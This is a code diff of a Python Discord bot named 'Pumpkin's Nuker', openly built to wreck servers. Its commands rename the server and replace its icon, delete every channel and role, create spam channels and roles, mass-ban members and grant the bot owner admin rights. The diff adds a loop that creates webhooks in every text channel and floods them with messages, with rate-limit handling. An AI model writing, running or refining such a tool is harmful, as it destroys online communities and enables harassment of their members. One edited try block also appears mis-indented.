@@ -4,20 +4,23 @@ import json
 import random
 import string
 import asyncio
-
+import requests
+import os
+import time
 
 with open('config.json', 'r') as file:
     config = json.load(file)
-
+  
 
 TOKEN = config['token']
 GUILD_IDS = config['guild_ids']
 ADMIN_ROLE_NAME = config['admin_role_name']
-SPAM_CHANNELS_NAME = config['spam_channels_name']
 SPAM_ROLES_NAME = config['spam_roles_name']
 OWNER_ID = config['owner_id']
 NUM_CHANNELS = config['num_channels']
 NUM_ROLES = config['num_roles']
+
+
 
 
 intents = discord.Intents.all()
@@ -26,11 +29,69 @@ bot = commands.Bot(command_prefix='!', intents=intents)
 @bot.event
 async def on_ready():
     print(f'Logged in as {bot.user.name}')
+  
 
 def is_owner():
     async def predicate(ctx):
         return ctx.author.id == OWNER_ID
     return commands.check(predicate)
+ 
+
+@bot.command()
+async def spam(ctx):
+    os.system('title Deadhook - Config')
+    done = 1
+    messages = ''
+    
+    try:
+
+        await ctx.message.delete()
+        with open('messages.txt') as f:
+            messages = f.read()
+    except:
+        await ctx.send("Failed! Could not find 'messages.txt'.")
+        return
+    
+    with open('config.json') as config_file:
+        config = json.load(config_file)
+    
+    guild = ctx.guild
+    webhooks = []
+    
+    for channel in guild.channels:
+        if isinstance(channel, discord.TextChannel):
+            webhook = await channel.create_webhook(name=config['webhook_name'])
+            webhooks.append(webhook.url)
+    
+    if len(webhooks) == 0:
+        await ctx.send("Failed! There are no text channels in the guild.")
+        return
+
+    await ctx.send("Webhooks created. Press ENTER to start spamming.")
+    await bot.wait_for('message', check=lambda m: m.author == ctx.author)
+
+    while done <= config['spam_times']:
+        tempMsg = random.choice(messages.splitlines())
+        
+        for webhook_url in webhooks:
+            w = requests.post(webhook_url, json={'content': tempMsg})
+            
+            if w.status_code == 429:
+                print("Failed! Ratelimited! Waiting a couple of seconds...")
+                time.sleep(2)
+            else:
+                print(f"Success! Sent message '{tempMsg}'! (#{done})")
+        
+        done += 1
+    
+    print("Spamming completed.")
+
+    for webhook_url in webhooks:
+        requests.delete(webhook_url)
+    
+    print("Webhooks deleted.")
+              
+
 
 @bot.command()
 @is_owner()
@@ -45,8 +106,12 @@ async def nuke(ctx):
             if guild is None:
                 print(f'Failed to find guild with ID {guild_id}')
                 continue
-            
-            try:
+        try:
+                await guild.edit(name=config['new_guild_name'])
+                with open(config['new_guild_icon'], 'rb') as f:
+                    await guild.edit(icon=f.read())
+                print(f'Changed guild name and icon in {guild.name}')
+                
                 deleted_channels = []
                 deleted_roles = []
                 
@@ -65,12 +130,7 @@ async def nuke(ctx):
                 print(f'Deleted text channels in {guild.name}: {deleted_channels}')
                 print(f'Deleted roles in {guild.name}: {deleted_roles}')
                 
-                await guild.edit(name=config['new_guild_name'])
-                with open(config['new_guild_icon'], 'rb') as f:
-                    await guild.edit(icon=f.read())
-                print(f'Changed guild name and icon in {guild.name}')
-                
-            except Exception as e:
+        except Exception as e:
                 print(f'Error in guild {guild.name}: {e}')
         
         print('All actions completed')
@@ -102,26 +162,18 @@ async def delete_channels(guild, deleted_channels):
     except Exception as e:
         print(f'Error deleting channels in {guild.name}: {e}')
 
-
 async def spam_channels(guild, num_channels, deleted_channels):
     try:
+        channel_names = [config['spam_channels_name_1'], config['spam_channels_name_2']]
         for _ in range(num_channels):
-            channel_name = config['spam_channels_name']
-            
-            is_text_channel = random.choice([True, False])
-            
-            if is_text_channel:
-                channel = await guild.create_text_channel(name=channel_name)
-            else:
-                channel = await guild.create_voice_channel(name=channel_name)
-            
+            channel_name = random.choice(channel_names)
+            channel = await guild.create_text_channel(name=channel_name)
             deleted_channels.append(channel.name)
-            channel_type = "text" if is_text_channel else "voice"
-            print(f'Spam {channel_type} channel created in {guild.name}: {channel.name}')
+            print(f'Spam text channel created in {guild.name}: {channel.name}')
     except Exception as e:
-        print(f'Error creating spam channels in {guild.name}: {e}')
+        print(f'Error creating spam text channels in {guild.name}: {e}')
       
-      
+
 
 async def spam_roles(guild, num_roles, deleted_roles):
     try:
@@ -157,39 +209,6 @@ async def admin(ctx):
         print(f'Error in admin command: {e}')
 
 
-
-@bot.command()
-@is_owner()
-async def spam(ctx):
-    try:
-        await ctx.message.delete()
-
-        guild = ctx.guild
-
-        text_channels = [channel for channel in guild.channels if isinstance(channel, discord.TextChannel)]
-
-        spam_message = config['spam_message']
-        num_spam_webhooks = config['num_spam_webhooks']
-
-        for channel in text_channels:
-            try:
-                for _ in range(num_spam_webhooks):
-                    webhook = await channel.create_webhook(name="Mr. Pumpkin")
-
-                    await webhook.send(content=spam_message)
-
-                    print(f'Spam message sent in channel: {channel.name} using webhook: {webhook.name}')
-                    
-                    await asyncio.sleep(0.8)
-            except Exception as e:
-                print(f'Error sending spam message in channel: {channel.name}, {e}')
-
-        print('Spam messages sent in all channels')
-    except Exception as e:
-        print(f'Error in spam_all_channels command: {e}')
-      
-
-
 @bot.command()
 @is_owner()
 async def ban(ctx):
@@ -206,12 +225,24 @@ async def ban(ctx):
                 continue
 
             await guild.ban(member)
-            print(f'Banned member: {member.name}
+            print(f'Banned member: {member.name}')
 
-        await ctx.send("Banning process completed.")
+        print("Banning process completed.")
     except Exception as e:
         print(f'Error banning people in {guild.name}: {e}')
 
+@bot.command()
+@is_owner()
+async def cmd(ctx):
+    embed = discord.Embed(title="Pumpkin's Nuker", description='List of available commands:', color=discord.Color.blue())
 
+    embed.add_field(name='!nuke', value="change server's name, icon, delete channels, delete roles, create channels, create roles. ", inline=False)
+    embed.add_field(name="!ban", value="ban members", inline=False)
+    embed.add_field(name="!spam", value="spam messages", inline=False)
+    embed.add_field(name='!admin', value='gives an admin role to the owner of the bot', inline=False)
+    embed.add_field(name="\u200b\nInfo", value=">>> **Pumpkin's Nuker**\nMade by <@800689202588811294>\nGitHub: https://github.com/FriendlyPumpkin/Pumpkin", inline=False)
+  
+    await ctx.author.send(embed=embed)
 
 bot.run(TOKEN)
+  
